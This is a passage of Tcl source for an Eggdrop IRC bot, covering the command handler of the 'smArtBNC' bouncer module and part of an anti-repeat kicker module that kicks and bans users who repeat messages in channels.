		    regsub -all " " $q ", " q
		    pn $i 256 "Joined channels\t: $q"
		}
	    }
	    pn $i 263 "--------------------------------"
	}
	".bchat" {
	    if {$s == 0 || [lsearch -exact "User Owner" [bi $bnc_u($i) 2]] == -1} {
		pn $i 461 "BCHAT - Sorry, only registered users can join the party-line !"
		pn $i 256 "Type '[b]/QUOTE .bident <nick> <password>[b]' to let the bot recognize you!"
		return 0
	    }
	    if {[bi $bnc_u($i) 4] == "@"} {
		pn $i 461 "BCHAT - You are not connected to an IRC-server.. This is an IRC-Only command!"
		pn $i 256 "Type '[b]/QUOTE .bhelp[b]' for help.."
		return 0
	    }
	    if {![matchattr $h p]} {
		pn $i 461 "BCHAT - Sorry, you don't have the +p flag, which is necessary to join the party-line.."
		pn $i 256 "Type '[b]/QUOTE .bhelp[b]' for help.."
		return 0
	    }
	    set q 0
	    if {[info exists users_port]} {
		set up $users_port
		set q 1
	    } elseif {[info exists all_port]} {
		set up $all_port
		set q 1
	    }
	    if {!$q} {
		pn $i 461 "BCHAT - Sorry, I can 't find a valid port for your connection.."
		return 0
	    }
	    if {$server == ""} {
		pn $i 461 "BCHAT - Sorry, host bot $bnick is not on an IRC-server at the moment, please try later.."
		return 0
	    }
	    set n [join [lindex $bnc_u($i) 4]]
	    pn $i 256 "Trying to establish a connection with $botnick.. Please, accept the DCC-CHAT request !"
	    bnc_log "\#$h\# bchat"
	    bnc_log "Accepted CHAT-request from Bounce user $h : DCC'ing $n.."
	    putquick "PRIVMSG $n :\001DCC CHAT chat [myip] $up\001"
	}
	".bserv" {
	    bnc_log "\#$h\# bserv"
	    pn $i 256 "[b]$bnick[b] serverlist:"
	    pn $i 263 "----------------------"
	    foreach q $servers {
		pn $i 256 $q
	    }
	    pn $i 263 "----------------------"
	    if {$server != ""} {
		pn $i 256 "I 'm currently on [b]$server[b] as $botnick.."
		pn $i 263 "----------------------"
	    }
	}
	".bdump" {
	    set d [stru [bi $a 1]]
	    if {$d == ""} {
		bnc_log "\#$h\# bdump"
		if {[bi $bnc_u($i) 6]} {
		    set q "enabled"
		} else {
		    set q "disabled"
		}
		pn $i 256 "Direct dumping mode is : [b]$q[b]"
		if {$q == "enabled"} {
		    pn $i 256 "Type '[b]/QUOTE .bdump OFF[b]' to disable."
		} else {
		    pn $i 256 "Type '[b]/QUOTE .bdump ON[b]' to enable."
		}
		return 0
	    }
	    if {$d == "ON"} {
		if {$s == 0} {
		    pn $i 461 "BDUMP - You can activate direct-dumping mode only when connected to a server!"
		    pn $i 256 "Type '[b]/QUOTE .bconn <server> \[port \[password \[sourceport\]\]\][b]' first!"
		    return 0
		}
		bnc_log "\#$h\# bdump ON"
		pn $i 256 "Direct-Dumping mode enabled, now sending your text without controls.."
		pn $i 256 "Type '[b]/QUOTE .bdump OFF[b]' to disable it."
		set bnc_u($i) [lreplace $bnc_u($i) 6 6 1]
	    } elseif {$d == "OFF"} {
		bnc_log "\#$h\# bdump OFF"
		pn $i 256 "Direct-Dumping mode disabled, now sending filtered text.."
		pn $i 256 "Type '[b]/QUOTE .bdump ON[b]' to enable it."
		set bnc_u($i) [lreplace $bnc_u($i) 6 6 0]
	    } else {
		bnc_log "\#$h\# bdump \[...\]"
		sputs $o [br $a 1 end]
	    }
	}
	".bverb" {
	    if {[bi $bnc_u($i) 2] != "Owner"} {
		pn $i 461 "BVERB - Sorry, you are not allowed to use this command."
		pn $i 256 "Type '[b]/QUOTE .bhelp[b]' for help.."
		return 0
	    }
	    set p [strl [bi $a 1]]
	    if {$p == ""} {
		bnc_log "\#$h\# bverb"
		pn $i 256 "Verbose mode is : [b][bi $bnc_u($i) 9][b]."
		pn $i 256 "Type '[b]/QUOTE .bverb ON or OFF[b]' to modify.."
		return 0
	    }
	    if {[lsearch -exact "on off" $p] == -1} {
		pn $i 461 "BVERB - Usage : '[b]/QUOTE .bverb ON or OFF[b]'."
		return 0
	    }
	    bnc_log "\#$h\# bverb $p"
	    set bnc_u($i) [lreplace $bnc_u($i) 9 9 $p]
	    pn $i 256 "Verbose mode is now [b]$p[b]"
	}
	".birc" {
	    set p [strl [bi $a 1]]
	    if {$p == ""} {
		bnc_log "\#$h\# birc"
		pn $i 256 "IRC-Style mode is : [b][bi $bnc_u($i) 7][b]."
		pn $i 256 "Type '[b]/QUOTE .birc ON or OFF[b]' to modify.."
		return 0
	    }
	    if {[lsearch -exact "on off" $p] == -1} {
		pn $i 461 "BIRC - Usage : '[b]/QUOTE .birc ON or OFF[b]'."
		return 0
	    }
	    bnc_log "\#$h\# birc $p"
	    set bnc_u($i) [lreplace $bnc_u($i) 7 7 $p]
	    pn $i 256 "IRC-Style mode is now [b]$p[b]"
	}
	".bpsy" {
	    set p [strl [bi $a 1]]
	    if {$p == ""} {
		bnc_log "\#$h\# bpsy"
		pn $i 256 "PSY-BNC mode is : [b][bi $bnc_u($i) 11][b]."
		pn $i 256 "Type '[b]/QUOTE .bpsy ON or OFF[b]' to modify.."
		return 0
	    }
	    if {[lsearch -exact "on off" $p] == -1} {
		pn $i 461 "BPSY - Usage : '[b]/QUOTE .bpsy ON or OFF[b]'."
		return 0
	    }
	    bnc_log "\#$h\# bpsy $p"
	    set bnc_u($i) [lreplace $bnc_u($i) 11 11 $p]
	    pn $i 256 "PSY-BNC mode is now [b]$p[b]"
	}
	".bping" {
	    if {$s == 0 || [bi $bnc_u($i) 4] == "@"} {
		pn $i 461 "BPING - You are not connected to any servers.. This is an IRC-Only"
		pn $i 461 "BPING - command, you can use it only when connected to an IRC-Server.."
		pn $i 256 "Type '[b]/QUOTE .bhelp[b]' for help.."
		return 0
	    }
	    set p [bi $a 1]
	    if {$p == ""} {
		if {[bi $bnc_u($i) 8] == 0} {
		    set q "[b]disabled[b]"
		} else {
		    set q "[b][bi $bnc_u($i) 8][b] minutes"
		}
		bnc_log "\#$h\# bping"
		pn $i 256 "Current IRC-ping interval is : $q."
		pn $i 256 "Type '[b]/QUOTE .bping <minutes\#>[b]' to modify.. ( valid range is 5 - 60 minutes, 0 to disable )"
		return 0
	    }
	    if {[string trim $p "0123456789"] != "" || ($p != 0 && ([expr $p] > 60 || [expr $p] < 5))} {
		pn $i 461 "BPING - Please, enter a numerical value in the range 5 - 60 minutes ( 0 to disable )"
		return 0
	    }
	    bnc_log "\#$h\# bping $p"
	    set bnc_u($i) [lreplace $bnc_u($i) 8 8 $p]
	    if {$p == 0} {
		set q "[b]disabled[b]"
	    } else {
		set q "set to [b]$p[b] minutes"
	    }
	    pn $i 256 "IRC-ping interval $q."
	}
	".bgo" {
	    if {$s == 0 || [bi $bnc_u($i) 4] == "@"} {
		pn $i 461 "BGO - You are not connected to any servers.. This is an IRC-Only"
		pn $i 461 "BGO - command, you can use it only when connected to an IRC-Server.."
		pn $i 256 "Type '[b]/QUOTE .bhelp[b]' for help.."
		return 0
	    }
	    if {[lsearch -exact "User Owner" [bi $bnc_u($i) 2]] == -1} {
		pn $i 461 "BGO - Sorry, only registered users can do that.."
		pn $i 256 "Type '[b]/QUOTE .bident <nick> <password>[b]' to let Bounce System recognize you !"
		return 0
	    }
	    set n [bbr [bi $a 1]]
	    bnc_log "\#$h\# bgo [join $n]"
	    if {$n != ""} {
		pn $i 256 "Trying to set your away-nick to [b][join $n][b]"
		sputs $o "NICK [join $n]"
		set bnc_u($i) [lreplace $bnc_u($i) 4 4 $n]
	    }
	    pn $i 256 "Setting up a virtual clone to keep alive your connection.."
	    pn $i 256 "See you next time, remember to use '[b]/QUOTE .brestore idx\#[b]' to restore your connection! Bye! ;D"
	    bnc_go $i
	}
	".brestore" - ".btake" {
	    set c [string range $c 1 end]
	    if {$c == "btake"} { set C "Tackable" } else { set C "Restorable" }
	    set n [bi $a 1]
	    if {$n == ""} {
		bnc_log "\#$h\# $c"
		set r ""
		foreach j [array names bnc_u] {
		    if {$j != $i} {
			if {[bi $bnc_u($i) 2] == "Owner" || [strl [bi $bnc_u($j) 3]] == [strl $h]} {
			    if {$c == "btake" || [bi $bnc_u($j) 10] != 0} {
				lappend r $j
			    }
			}
		    }
		}
		if {$r == ""} {
		    pn $i 256 "$C connections : [b]none[b]"
		} else {
		    pn $i 256 "$C connections :"
		    foreach j $r {
			set q "idx [b]$j[b]"
			if {[bi $bnc_u($j) 4] != "@"} {
			    append q " : [join [lindex $bnc_u($j) 4]]"
			}
			set s [split [bi $bnc_u($j) 5] @]
			if {$s != 0} {
			    append q " - [bi $s 0] port [bi $s 1]"
			    if {[bi $s 2] != ""} { append q " pass [bi $s 2]" }
			} else {
			    append q " - no server"
			}
			if {[bi $bnc_u($j) 10] != 0} {
			    append q " ( [ctime [bi $bnc_u($j) 10]] )"
			} else {
			    append q " ( active connection )"
			}
			pn $i 256 $q
		    }
		    pn $i 256 "Type '[b]/QUOTE .$c <idx\#>[b]' to [string range $c 1 end]."
		}
		return 0
	    }
	    if {[info exists bnc_u($n)]} {
		if {[bi $bnc_u($i) 2] == "Owner" || [strl [bi $bnc_u($j) 3]] == [strl $h]} {
		    if {$c == "btake" || [bi $bnc_u($n) 10] != 0} {
			bnc_log "\#$h\# $c $n"
			bnc_rest $i $n
		    } else {
			pn $i 461 "[stru $c]  Invalid idx! I need a numerical value matching a valid idx!"
			pn $i 256 "Type '[b]/QUOTE .$c[b]' to have a list.."
		    }
		} else {
		    pn $i 461 "[stru $c] Sorry, you don 't own this connection !"
		    pn $i 256 "Type '[b]/QUOTE .$c[b]' to have a list.."
		    return 0
		}
	    }
	}
	".bread" {
	    set n [bi $a 1]
	    if {$n == ""} {
		bnc_log "\#$h\# bread"
		set r [bnc_logs $h]
		pn $i 256 "Readable messages : $r"
		if {$r != "[b]no [b]messages[b][b]"} {
		    pn $i 256 "Type '[b]/QUOTE .bread <mex-ID\#>[b]' to read ( and delete ) messages.."
		}
		return 0
	    }
	    set l "$bnc_module_conf.msg.[strl $h].$n"
	    if {![file exists $l]} {
		pn $i 461 "BREAD Invalid idx! I need a numerical value matching a valid message-log!"
		pn $i 256 "Type '[b]/QUOTE .bread[b]' to have a list.."
		return 0
	    }
	    bnc_log "\#$h\# bread $n"
	    set fd [open $l r]
	    while {![eof $fd]} {
		gets $fd d
		if {[eof $fd]} { break }
		set d [ctime $d]
		gets $fd m
		putdcc $i "$m ( $d )"
	    }
	    close $fd
	    file delete -force $l
	    pn $i 256 "Bounce: Ok, logfile for virtual clone $n readed and deleted! ;)"
	}
	".bhelp" {
	    bnc_log "\#$h\# bhelp"
	    pn $i 461 "BHELP [b]Bouncer System ver $bnc_rev by ^Boja^[b]"
	    pn $i 256 "[b].bident[b] <handle> <password>"
	    pn $i 256 "[b].bconn[b] <server> \[port \[password \[sourceport\]\]\]"
	    pn $i 256 "[b].bdump[b] \[on / off\] / \[text\]"
	    pn $i 256 "[b].bdisc[b] \[quit-message\]"
	    pn $i 256 "[b].bserv[b]"
	    pn $i 256 "[b].bstat[b]"
	    if {[bi $bnc_u($i) 2] == "Owner"} {
		pn $i 256 "[b].bwho[b]"
		pn $i 256 "[b].bverb[b] \[on / off\]"
		pn $i 256 "[b].bkill[b] <user-idx\#> \[reason\]"
	    }
	    pn $i 256 "[b].bquit[b]"
	    pn $i 256 "[b].bgo[b] \[your-away-nick\]"
	    pn $i 256 "[b].brestore[b] \[idx\#\]"
	    pn $i 256 "[b].btake[b] \[idx\#\]"
	    pn $i 256 "[b].bvhosts[b] \[command\]"
	    pn $i 256 "[b].bvhost \[newvhost\]"
	    pn $i 263 "------=> IRC-Only Commands <=------"
	    pn $i 256 "[b].breg[b] <nickname> \[ident \[realname\]\]"
	    pn $i 256 "[b].bping[b] \[minutes\# / 0\]"
	    pn $i 256 "[b].bchat[b]"
	    pn $i 256 "[b].bread[b] \[message-ID\#\]"
	    pn $i 263 "-----------------------------------"
	    pn $i 256 "Type '[b]/QUOTE <command> \[parameters\][b]'.."
	}
	default {
	    if {$s != 0} {
		if {[validsocket $o]} {
		    sputs $o $a
		} else {
		    bnc_disc $i "[sputs $o $a]"
		}
	    } else {
		pn $i 263 "Warning - You are not connected to any servers.."
		pn $i 256 "Type '[b]/QUOTE .bhelp[b]' for help.."
	    }
	}
    }
    return 0
}

proc bnc_disc {i a} {
    global bnc_u
    if {![info exists bnc_u($i)]} { return 0 }
    set s [split [bi $bnc_u($i) 5] @]
    set s "[bi $s 0] port [bi $s 1]"
    if {$s != 0 && [valididx $i]} {
	bnc_log "[bi $bnc_u($i) 3] disconnected from server $s"
	if {[bi $bnc_u($i) 2] == "Bot"} {
	    bnc_go $i
	    return 0
	}
	if {[bi $bnc_u($i) 7] == "on"} {
	    set n [join [lindex $bnc_u($i) 4]]
	    set bnc_u($i) [lreplace $bnc_u($i) 19 19 [bbr $n]]
	    if {[lindex $bnc_u($i) 15] != "@" && [valididx $i]} {
		foreach c [lindex $bnc_u($i) 15] { putdcc $i ":$n PART [lindex $c 0] :Disconnected from server" }
	    }
	}
	pn $i 263 "Sorry, connection to server [b]$s[b] dropped.."
	if {$a != ""} { pn $i 263 $a }
	pn $i 256 "Type '[b]/QUOTE .bstat[b]' to check your details!"
	set bnc_u($i) [lreplace $bnc_u($i) 4 5 @ 0]
	set bnc_u($i) [lreplace $bnc_u($i) 13 15 @ @ @]
	foreach t [timers] { if {[lindex $t 1] == "bnc_ping $i"} { killtimer [lindex $t 2] } }
    }
}

proc bnc_bst i {
    global bnc_module_conf
    foreach t [utimers] {
	if {[lindex $t 1] == "bnc_store $i"} {
	    killutimer [lindex $t 2]
	}
    }
    if {![file exists $bnc_module_conf.conn.$i]} { bnc_store $i }
    utimer 10 "bnc_store $i"
}

proc bnc_rnick n {
    set b [string range $n 0 5]
    set n "$b[rw 3]"
    return $n
}

proc bnc_rf {i a} {
    global bnc_u
    if {![info exists bnc_u($i)]} { return 0 }
    if {[bi $a 0] == "PING"} { sputs [bi $bnc_u($i) 0] "PONG [bi $a 1]" ; return 0 }
    proc nchk {i w a} {
	global bnc_u
	set N [strl [join [lindex $bnc_u($i) 4]]]
	if {$w} {
	    set n [strl [bi $a 3]]
	} else {
	    set n [strl [string range $a 1 [expr [string first ! $a] - 1]]]
	}
	if {$n != $N} { return 0 }
	return 1
    }
    proc chrem {i a} {
	global bnc_u
	set c [strl [bi $a 2]]
	set r [lindex $bnc_u($i) 15]
	foreach j $r {
	    if {[lindex $j 0] == $c} {
		set x [lsearch -exact $r $j]
		set r [lreplace $r $x $x]
		if {$r == ""} { set r "@" }
		set bnc_u($i) [lreplace $bnc_u($i) 15 15 $r]
		bnc_bst $i
		break
	    }
	}
    }
    switch -exact -- [bi $a 1] {
	001 {
	    set N [join [lindex $bnc_u($i) 4]]
	    set n [bi $a 2]
	    if {$n != $N} { set bnc_u($i) [lreplace $bnc_u($i) 4 4 [bbr $n]] }
	    set s [string range [bi $a 0] 1 end]
	    set bnc_u($i) [lreplace $bnc_u($i) 17 17 $s]
	    bnc_log "IRC-Connection established for user [bi $bnc_u($i) 3] ( idx [b]$i[b] ) - server realname : $s - IRC nickname : $n"
	    bnc_bst $i
	    if {[lindex $bnc_u($i) 19] != "@"} { putdcc $i ":[join [lindex $bnc_u($i) 19]] NICK :$n" }
	}
	431 - 432 - 433 - 438 {
	    if {![valididx $i] || [bi $bnc_u($i) 10] != 0} {
		sputs [bi $bnc_u($i) 0] "NICK [bnc_rnick [join [lindex $bnc_u($i) 4]]]"
	    }
	}
	"NICK" {
	    if {![nchk $i 0 $a]} { return 0 }
	    set bnc_u($i) [lreplace $bnc_u($i) 4 4 [string range [bbr [bi $a 2]] 1 end]]
	    bnc_bst $i
	}
	"JOIN" {
	    if {![nchk $i 0 $a]} { return 0 }
	    set c [string range [strl [bi $a 2]] 1 end]
	    set r [lindex $bnc_u($i) 15]
	    if {$r == "@"} { set r "" }
	    set o 1
	    foreach j $r {
		if {[lindex $j 0] == $c} {
		    set o 0
		    break
		}
	    }
	    if {$o} {
		lappend r $c
		set bnc_u($i) [lreplace $bnc_u($i) 15 15 $r]
		set o [bi $bnc_u($i) 0]
		if {[validsocket $o]} { sputs $o "MODE $c" }
		bnc_bst $i
	    }
	    if {[bi $bnc_u($i) 12] && [bi $bnc_u($i) 10] != 0 && [bi $bnc_u($i) 2] != "Bot"} {
		if {[validchan $c] && [botonchan $c] && [botisop $c]} {
		    utimer [expr 5 + [rand 10]] "pushmode $c +o [p_test [join [lindex $bnc_u($i) 4]]]"
		}
	    }
	}
	"PART" {
	    if {![nchk $i 0 $a]} { return 0 }
	    chrem $i $a
	}
	"KICK" {
	    if {![nchk $i 1 $a]} { return 0 }
	    if {[bi $bnc_u($i) 10] == 0} {
		chrem $i $a
		return 0
	    }
	    utimer 2 "bnc_rej $i"
	    utimer 12 "bnc_adj $i"
	}
	311 {
	    if {![nchk $i 1 $a]} { return 0 }
	    set u [strip_id [bbr [bi $a 4]]]
	    set r [string range [bbr [br $a 7 end]] 1 end]
	    set bnc_u($i) [lreplace $bnc_u($i) 13 14 $u $r]
	    bnc_bst $i
	}
	319 {
	    if {![nchk $i 1 $a]} { return 0 }
	    set ch [string range [strl [br $a 4 end]] 1 end]
	    set r ""
	    foreach c $ch {
		set k [string index $c 0]
		if {$k == "@" || $k == "+"} {
		    set c [string range $c 1 end]
		}
		lappend r $c
	    }
	    if {[bi $bnc_u($i) 10] != 0} {
		set w 1
		foreach c [lindex $bnc_u($i) 15] {
		    set q 1
		    foreach k $r {
			if {[lindex $c 0] == $k} {
			    set q 0
			    break
			}
		    }
		    if {$q} {
			set w 0
			break
		    }
		}
		if {$w} {
		    foreach t [utimers] {
			if {[lindex $t 1] == "bnc_rej $i"} {
			    killutimer [lindex $t 2]
			} elseif {[lindex $t 1] == "bnc_adj $i"} {
			    killutimer [lindex $t 2]
			}
		    }
		}
	    }
	    if {$r == ""} { set r "@" }
	    if {[valididx $i] && [bi $bnc_u($i) 10] == 0} {
		set bnc_u($i) [lreplace $bnc_u($i) 15 15 $r]
		bnc_bst $i
	    }
	}
	324 - "MODE" {
	    if {[bi $a 1] == 324} { set n 3 } else { set n 2 }
	    set c [strl [bi $a $n]]
	    set m [bi $a [expr $n + 1]]
	    if {[string match *k* $m]} {
		if {[string match *l* $m]} { incr n 3 } else { incr n 2 }
		set p [bi $a $n]
	    }
	    if {[info exists p] && $p != ""} {
		set r [lindex $bnc_u($i) 15]
		foreach j $r {
		    if {[lindex $j 0] == $c} {
			set x [lsearch -exact $r $j]
			set j "[lindex $j 0] $p"
			set r [lreplace $r $x $x $j]
			set bnc_u($i) [lreplace $bnc_u($i) 15 15 $r]
			bnc_bst $i
			break
		    }
		}
	    }
	}
	default {}
    }
}

proc bnc_recv {i s} {
    global bnc_u
    if {![info exists bnc_u($i)]} { return 1 }
    set t [sgets $s]
    if {![valididx $i] || ![validsocket $s] || [eof $s]} {
	dosocket close $s
	utimer 1 "bnc_disc $i {Error while receiving data ( idx $i, socket $s )}"
	return 1
    }
    if {[bi $bnc_u($i) 7] == "on"} { bnc_rf $i $t }
    putdcc $i $t
}

proc bnc_log a {
    global bnc_l bnc_u
    if {$bnc_l == "off"} { return 0 }
    putlog "\[=smArtBNC=\] - $a"
    foreach i [array names bnc_u] {
	if {[valididx $i] && [bi $bnc_u($i) 2] == "Owner"} {
	    if {[bi $bnc_u($i) 9] == "on"} {
		pn $i 256 $a
	    }
	}
    }
}

if {$bnc == "on"} {
    foreach i [array names bnc_u] {
	if {![pn $i 382 "Rehashing System.."] && [bi $bnc_u($i) 10] == 0} {
	    bnc_k $i
	}
    }
    bnc_stop
    if {![bnc_start $bnc_p]} {
	bl "[b]Warning!!![b] - Error opening Bouncer port : [b]$bnc_p[b] ! System disabled.."
	set bnc "off"
	bnc_save
    } else {
	al init "Bounce System loaded and ready to work (enabled)!"
	set bnc_s [glob -nocomplain -- $bnc_module_conf.conn.*]
	foreach f $bnc_s {
	    set i [string range $f [expr [string last . $f] + 1] end]
	    if {![info exists bnc_u($i)]} {
		source $f
		if {$i <= ${max-dcc}} {
		    if {![pn $i 382 "Restarting System.."]} {
			bnc_go $i
		    } elseif {![validsocket [bi $bnc_u($i) 0]]} {
			bnc_disc $i "Restarting System.."
		    }
		} else {
		    utimer [expr 5 + [rand 5]] "bnc_rc $i"
		}
	    }
	    unset i
	}
    }
} else {
    al init "Bounce System loaded and ready to work (disabled)!"
    bnc_stop 1
}
if {[info exists bnc_s]} { unset bnc_s }
set bnc_module_loaded 1
}
set smart_rep {# Anti Repeat

global wpref rep_module_loaded
global rep_module_conf rep_ver rep_ver1 rep_allow rep_time rep_chan rep_ban rep_bantime rep_msg rep_type rep_n rep_k repeater

bind dcc m|m repeat dcc:repeat

set rep_module_conf "$wpref.repeat"
set rep_ver ""
set rep_ver1 "1.6"
set rep_allow 2
set rep_time 30
set rep_chan {}
set rep_ban "2"
set rep_bantime 15
set rep_msg "Please, don't repeat!"
set rep_type "off"

proc rep_save {} {
    global rep_allow rep_time rep_chan rep_ban rep_bantime rep_msg rep_type rep_module_conf rep_ver
    set fileid [open $rep_module_conf w]
    puts $fileid "set rep_ver \"$rep_ver\""
    puts $fileid "set rep_allow $rep_allow"
    puts $fileid "set rep_time $rep_time"
    puts $fileid "set rep_chan {$rep_chan}"
    puts $fileid "set rep_ban \"$rep_ban\""
    puts $fileid "set rep_bantime $rep_bantime"
    puts $fileid "set rep_msg \"$rep_msg\""
    puts $fileid "set rep_type \"$rep_type\""
    puts $fileid "al init \"Repeat-Kicker configuration loaded and ready!\""
    close $fileid
}

if {![file exist $rep_module_conf]} {
    al init "Repeat-Kicker conf file not found..Generating defaults.."
    rep_save
}

source $rep_module_conf

if {$rep_ver1 != $rep_ver} {
    set rep_ver $rep_ver1
    rep_save
}

unset rep_ver1

proc rep_utimer {n d} {
    global rep_n
    if {[info exists rep_n("$n$d")]} {
	unset rep_n("$n$d")
    }
}

proc rep_timer {n d} {
    global rep_k
    if {[info exists rep_k("$n$d")]} {
	unset rep_k("$n$d")
    }
}

proc bstr {t} {
    regsub -all "\\\\" $t "@" t
    regsub -all "\\\[" $t "!" t
    regsub -all "\\\]" $t "~" t
    regsub -all "\\\{" $t "°" t
    regsub -all "\\\}" $t "§" t
    return $t
}

proc rep_routine {ni uh h d t} {
    global rep_allow rep_time rep_chan rep_ban rep_bantime rep_msg rep_type
    global rep_ver repeater rep_n rep_k botnick altnick
    if {$d == $botnick || $d == $altnick || [matchattr $h f|f $d] || [isop $ni $d]} { return 0}
    set d [strl $d]
    if {($rep_type == "list") && (![string match *$d* $rep_chan])} { return 0 }
    set n [strl [bstr $ni]]
    if [info exists repeater("$n$d")] {
	if {[string compare [strl $repeater("$n$d")] [strl $t]] == 0} {
	    if {[info exists rep_n("$n$d")]} {
		incr rep_n("$n$d")
	    } else {
		set rep_n("$n$d") 1
	    }
	    foreach t [utimers] {
		if {[string match "*rep_utimer $n *$d*" [lindex $t 1]]} {
		    killutimer [lindex $t 2]
		}
	    }
	    utimer $rep_time "rep_utimer $n $d"
	    if {$rep_n("$n$d") > $rep_allow} {
		if {[info exists rep_k("$n$d")]} {
		    incr rep_k("$n$d")
		} else {
		    set rep_k("$n$d") 1
		}
		foreach t [timers] {
		    if {[string match "*rep_timer $n *$d*" [lindex $t 1]]} {
			killtimer [lindex $t 2]
		    }
		}
		timer 60 "rep_timer $n $d"
		if {$rep_ban != "no"} {
		    if {$rep_ban != "yes" && $rep_ban != "no"} {
			set rep_ban [expr $rep_ban]
		    }
		    set banmask [wmh $uh ban]
		    if {$rep_ban == "yes"} {
			newchanban $d $banmask Rep-Kick $rep_msg $rep_bantime
		    } elseif {$rep_k("$n$d") > $rep_ban} {
			newchanban $d $banmask Rep-Kick $rep_msg $rep_bantime
			unset rep_k("$n$d")
		    }
		}
		if {[botisop $d]} {
		    putkick $d $ni $rep_msg
		}
		unset repeater("$n$d")
		unset rep_n("$n$d")
		foreach t [utimers] {
		    if {[string match "*rep_utimer $n *$d*" [lindex $t 1]]} {
			killutimer [lindex $t 2]
		    }
		}
	    }
	} else {
	    set repeater("$n$d") $t
	    set rep_n("$n$d") 1
	    foreach t [utimers] {
		if {[string match "*rep_utimer $n *$d*" [lindex $t 1]]} {
		    killutimer [lindex $t 2]
		}
	    }
	    utimer $rep_time "rep_utimer $n $d"
	}
    } else {
	set repeater("$n$d") $t
	set rep_n("$n$d") 1
	foreach t [utimers] {
	    if {[string match "*rep_utimer $n *$d*" [lindex $t 1]]} {
		killutimer [lindex $t 2]
	    }
	}
	utimer $rep_time "rep_utimer $n $d"
    }
}

proc rep_pubm {n uh h c t} {
    rep_routine $n $uh $h $c "$t"
}

proc rep_action {n uh h d k t} {
    rep_routine $n $uh $h $d "$t"
}

proc rep_nick {on uh h c nn} {
    if {([matchattr $h f|f $c]) || ([isop $on $c])} { return 0 }
    global repeater rep_n
    set oldn [strl [bstr $on]]
    set newn [strl [bstr $nn]]
    if {([info exists repeater($oldn$c)]) && (![info exists repeater($nn$c)])} {
	set repeater($nn$c) $repeater($oldn$c)
	set rep_n($nn$c) $rep_n($oldn$c)
	unset repeater($oldn$c)
	unset rep_n($oldn$c)
    }
}

proc rep_start {} {
    set b [lindex [binds rep_pubm] 0]
    if {$b == ""} {
	catch {bind pubm - * rep_pubm}
    }
    set b [lindex [binds rep_action] 0]
    if {$b == ""} {
	catch {bind ctcp - ACTION rep_action}
    }
    set b [lindex [binds rep_nick] 0]
    if {$b == ""} {
	catch {bind nick - * rep_nick}
    }
}

proc rep_stop {} {
    set b [lindex [binds rep_pubm] 0]
    if {$b != ""} {
	catch {unbind pubm - * rep_pubm}
    }
    set b [lindex [binds rep_action] 0]
    if {$b != ""} {
	catch {unbind ctcp - ACTION rep_action}
    }
    set b [lindex [binds rep_nick] 0]
    if {$b != ""} {
	catch {unbind nick - * rep_nick}
    }
}

if {$rep_type == "off"} {
    rep_stop
} else {
    rep_start
}

proc dcc:repeat {h idx arg} {
    global rep_allow rep_time rep_chan rep_ban rep_bantime rep_msg rep_type rep_module_conf rep_ver
    set param1 [strl [bi $arg 0]]
    set param2 [strl [bi $arg 1]]
    putcmdlog "#$h# repeat $param1 $param2"
    if { $param1 == "" } {
	putdcc $idx "[boja]--=> Repeat-Kicker settings <=--"
	putdcc $idx "[boja]----------------------------------------"
	putdcc $idx "[boja] [b]*[b] Repeat-Kicker ver\t: $rep_ver"
	putdcc $idx "[boja] [b]*[b] Allowed repetitions\t: $rep_allow"
	putdcc $idx "[boja] [b]*[b] Time between reps\t: $rep_time secs"
	if {($rep_ban != "yes") && ($rep_ban != "no")} {
	    putdcc $idx "[boja] [b]*[b] Ban transgressors?\t: after $rep_ban kicks"
	} else {
	    putdcc $idx "[boja] [b]*[b] Ban transgressors?\t: $rep_ban"
	}
	if {$rep_bantime == 0} {
	    putdcc $idx "[boja] [b]*[b] Repeater's Ban time\t: permanent"
	} else {
	    putdcc $idx "[boja] [b]*[b] Repeater's Ban time\t: $rep_bantime min"
	}
	putdcc $idx "[boja] [b]*[b] Repeat-Kicker type\t: $rep_type"
	putdcc $idx "[boja] [b]*[b] Repeat-Kick message\t: $rep_msg"
	if {$rep_type == "list"} {
	    set tmp ""
	    foreach tm $rep_chan {lappend tmp $tm}
	    if {$tmp == ""} { set tmp "-=no channels=-" }
	    putdcc $idx "[boja] [b]*[b] Monitored channels\t: $tmp"
	}
	putdcc $idx "[boja]----------------------------------------"
	putdcc $idx ""
	pb $idx "Type '[b].help repeat[b]' for command list and more.."
	return 0
    }
    switch -exact -- $param1 {
	"help" {
	    dccsimul $idx ".help repeat"
	}
	"ver" {
	    putcmdlog "\#$h\# repeat ver"
	    pb $idx "Repeat-Kicker version is $rep_ver ."
	    return 0
	}
	"add" {
	    set aerr 0
	    set tmp ""
	    if {$param2 == ""} {
		pb $idx "Repeat-Kicker : You must specify the channel to add!"
	    } else {
		foreach aa $rep_chan {
		    if {$aa==$param2} {set aerr 1}
		}
		if {$aerr!=0} {
		    pb $idx "Channel $param2 is already in Repeat-Kicker list! ;)"
		} else {
		    if {![matchattr $h m|m $param2]} {
			pb $idx "Sorry, you are not +m on $param2!"
			return 0
		    }
		    set rep_chan "$rep_chan $param2"
		    rep_save
		    bl "Added $param2 to the Repeat-Kicker chanlist : requested by $h."
		    foreach tm $rep_chan { lappend tmp $tm }
		    pb $idx "Updated Repeat-Kicker chanlist --> $tmp"
		}
	    }
	}
	"rem" {
	    set tmp ""
	    if {$param2 == ""} {
		pb $idx "Repeat-Kicker : You must specify the channel to remove!"
	    } else {
		if {![matchattr $h m|m $param2]} {
		    pb $idx "Sorry, you are not +m on $param2!"
		    return 0
		}
		foreach ch $rep_chan {
		    if { $ch!=$param2} { lappend tmp $ch }
		}
		set rep_chan $tmp
		rep_save
		bl "Removed $param2 from the Repeat-Kicker chanlist : requested by $h."
		set tmp ""
		foreach tm $rep_chan { lappend tmp $tm }
		pb $idx "Updated Repeat-Kicker chanlist --> $tmp"
	    }
	}
	"list" {
	    set tmp ""
	    foreach tm $rep_chan { lappend tmp $tm }
	    pb $idx "This is Repeat-Kicker chanlist --> $tmp"
	}
	"type" {
	    if {($param2 != "all") && ($param2 != "list") && ($param2 != "off")} {
		pb $idx "Current Repeat-Kicker type is : $rep_type."
		pb $idx "Specify 'all', 'list' or 'off' to change.. ;)"
	    } else {
		if {![matchattr $h m]} {
		    pb $idx "Repeat-Kicker : Sorry, only global masters can change that.."
		    return 0
		}
		pb $idx "Now monitoring type is : $param2."
		set rep_type $param2
		rep_save
		if {$rep_type == "off"} {
		    rep_stop
		} else {
		    rep_start
		}
		bl "Repeat-Kicker status set to \"$rep_type\" : Authorized by $h."
	    }
	}
	"allow" {
	    if {$param2=="" || [string trim $param2 "0123456789"] != ""} {
		pb $idx "Currently allowing : $rep_allow repetitions in $rep_time seconds."
